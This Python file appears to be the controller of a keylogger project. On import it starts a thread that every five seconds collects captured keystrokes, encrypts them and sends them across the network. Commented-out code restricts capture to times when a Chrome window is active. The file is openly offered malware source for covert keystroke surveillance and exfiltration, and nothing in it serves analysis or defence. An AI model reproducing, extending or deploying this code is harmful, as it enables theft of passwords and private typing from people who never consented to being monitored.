import json

from keyloggerAgent.encryptor_keylogger import Encryptor
from keyloggerAgent.service_keylogger import ServiceKeyLogger
# from keyloggerAgent.writer_KeyLogger_to_file import WriteToFile
from keyloggerAgent.writer_keylogger_to_network import WriterKeyloggerToNetwork
import pygetwindow as gw
import time
import threading
import psutil

class ManagerKeyLogger:
    def __init__(self):
        self.service = ServiceKeyLogger()
        self.write_to_network=WriterKeyloggerToNetwork()
        self.encryptor = Encryptor()
        # self.writeFile=WriteToFile()
        self.listener_running = False
        # self.manager_thread_monitor_chrome = threading.Thread(target=self.monitor_chrome)
        # self.manager_thread_monitor_chrome.start()
        self.manager_thread_collect_data = threading.Thread(target=self.collect_data)
        self.manager_thread_collect_data.start()
        self.decrypt=None

    # def monitor_chrome(self):
    #     while True:
    #         if self.is_keyboard_in_chrome():
    #             if not self.listener_running:
    #                 self.service = ServiceKeyLogger()
    #                 self.service.start()
    #                 self.listener_running = True
    #         else:
    #             if self.listener_running:
    #                 self.service.listener.stop()
    #                 self.listener_running = False
    #
    #         time.sleep(2)

    def collect_data(self):
        while True:
            time.sleep(5)
            data = self.service.get_data()
            if data:
              text_encrypt=self.encryptor.encrypt(data)

              self.write_to_network.write(text_encrypt)
              # self.writeFile.write(text_encrypt)
              # data_json = self.writeFile.load_data()
              # decrypt = self.encryptor.decrypt(data_json)
              # self.decrypt=decrypt
              # self.get_data(decrypt)

              print("Original Data:", data)
              print("Encrypted Data:", text_encrypt)
              # print("Data from File:", data_json)
              # print("Decrypted Data:", decrypt)
              # print(decrypt)
    def get_data(self):
        return self.decrypt

    def is_keyboard_in_chrome(self):
        active_window = gw.getActiveWindow()

        return active_window and "chrome" in active_window.title.lower()

manager = ManagerKeyLogger()
